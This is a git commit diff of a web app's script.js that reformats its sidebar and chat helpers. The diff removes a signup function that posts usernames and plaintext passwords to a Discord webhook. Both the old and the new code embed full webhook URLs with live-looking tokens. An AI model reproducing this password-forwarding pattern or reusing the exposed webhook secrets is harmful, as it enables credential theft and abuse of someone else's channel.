b1eaf8d1ea5e2e98b06aac0fcf3839fca87cd77e
kashioapp <contact@kashioapp.com>
2026-03-26 22:49:38 -0400

    Update script.js

--- script.js
+++ script.js
@@ -1,43 +1,17 @@
-// SIDEBAR TOGGLE
-function toggleSidebar() {
-    document.querySelector(".sidebar").classList.toggle("collapsed");
+function toggleSidebar(){
+document.querySelector(".sidebar").classList.toggle("collapsed");
 }
 
-// CHAT
-function toggleChat() {
-    document.querySelector(".chat-box").classList.toggle("open");
+function toggleChat(){
+document.querySelector(".chat-box").classList.toggle("open");
 }
 
-// SEND CHAT → YOUR WEBHOOK
-function sendMessage() {
-    const input = document.getElementById("chatInput");
-    const msg = input.value;
+function sendMessage(){
+const msg = document.getElementById("chatInput").value;
 
-    if (!msg) return;
-
-    fetch("https://discord.com/api/webhooks/1486913651712724992/nK_fkyLouoC1FXHeLKXIH_XyBjSI_2k5RzcILzOcNpW38khjkqpqctAQtKz-v6RKLyog", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            content: "Support Message: " + msg
-        })
-    });
-
-    input.value = "";
-}
-
-// SIGNUP SYSTEM → WEBHOOK
-function signup() {
-    const user = document.getElementById("username").value;
-    const pass = document.getElementById("password").value;
-
-    fetch("https://discord.com/api/webhooks/1486915810533314662/YmVunZtYx0xnh2yGzGIcrVdPMTCzX47uDpntZuyZL9CRPbEu6OCpdaLMxsLurZCNXuYi", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            content: `NEW USER\nUsername: ${user}\nPassword: ${pass}`
-        })
-    });
-
-    alert("Account Created");
+fetch("https://discord.com/api/webhooks/1486913651712724992/nK_fkyLouoC1FXHeLKXIH_XyBjSI_2k5RzcILzOcNpW38khjkqpqctAQtKz-v6RKLyog", {
+method:"POST",
+headers:{"Content-Type":"application/json"},
+body:JSON.stringify({content:msg})
+});
 }
